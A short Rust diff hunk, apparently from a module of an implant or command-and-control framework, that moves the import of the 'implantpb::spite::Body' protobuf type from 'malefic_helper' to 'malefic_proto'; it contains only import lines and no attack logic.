@@ -1,5 +1,5 @@
 use crate::{Module, TaskResult, check_request, Result, check_field};
-use malefic_helper::protobuf::implantpb::spite::Body;
+use malefic_proto::proto::implantpb::spite::Body;
 use async_trait::async_trait;
 use malefic_trait::module_impl;
 
